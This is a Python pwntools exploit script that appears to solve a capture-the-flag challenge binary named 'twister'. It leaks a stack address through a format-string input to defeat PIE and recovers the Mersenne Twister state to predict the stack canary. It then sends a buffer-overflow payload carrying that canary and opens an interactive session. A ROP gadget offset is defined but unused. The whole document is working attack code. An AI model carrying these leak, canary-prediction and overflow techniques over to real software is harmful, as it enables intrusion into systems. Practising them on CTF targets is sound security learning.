from pwn import *
from mt19937predictor import MT19937Predictor

def start(argv=[], *a, **kw):
    if args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

exe = './twister'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'warning'

p = start()

##### offsets

# size of the buffer that receives answers to the zetamac stuff
answer_buffer_size = 0xff

# since answer_buffer isn't a whole multiple of 8, there is 1 extra byte between the word containing the canary and the end of the buffer
end_answer_buffer_padding = 0x1

# canary is a uint32_t so we need this padding within the 8-byte word to actually get to it
canary_buffer_padding = 0x4

# offset between the leaked stack value (*canary+419) and piebase
base_leaked_stack_offset = 0x157b

# from ropper
pop_rbp_offset = 0x1313

##### leak a value off of the stack and get piebase
##### use gdb to verify that this value is *canary+419, and that its offset from piebase is base_leaked_stack_offset

p.sendlineafter(b']:', b'c')
p.sendlineafter(b'(y/n) ', b'%x')
p.recvuntil(b'user input: ')

stack_value = p.recvline()[:-1]
piebase = int(stack_value, 16) - base_leaked_stack_offset

print(f"piebase: {hex(piebase)}")

##### get the mersenne twister state

twister_state = []
p.sendlineafter(b'please try again:', b'n')
p.sendlineafter(b']:', b'c')
for _ in range(1000): # any number of iterations >= 624 works here
    p.recvuntil(b'canary_id: ')
    twister_state.append(int(p.recvline()[:-1]))
    p.sendlineafter(b'(y/n) ', b'y')

p.recvuntil(b'canary_id: ')
twister_state.append(int(p.recvline()[:-1]))
p.sendlineafter(b'(y/n) ', b'n')

##### get the canary

predictor = MT19937Predictor()
for state in twister_state:
    predictor.setrandbits(state, 32)
canary = predictor.getrandbits(32)
print("canary", hex(canary))

##### play the game and overflow the buffer

p.sendlineafter(b']:', b'p')

for i in range(10):
    p.recvuntil(b'. ')
    question = p.recvuntil(b':')[:-1].decode('utf-8')
    num1, num2 = map(int, question.split('+'))
    ans = num1 + num2

    encoded_ans = str(ans).encode()

    if i == 9:
        padding = b'A' * (answer_buffer_size + end_answer_buffer_padding - len(encoded_ans) - 1 + canary_buffer_padding)
        canary_bytes = canary.to_bytes(4, byteorder='little')
        payload = encoded_ans + b'\x00' + padding + canary_bytes + b'A' * 10
        p.sendline(payload)
    else:
        p.sendline(encoded_ans)

p.sendlineafter(b'(y/n) ', b'n')
p.interactive()

p.close()
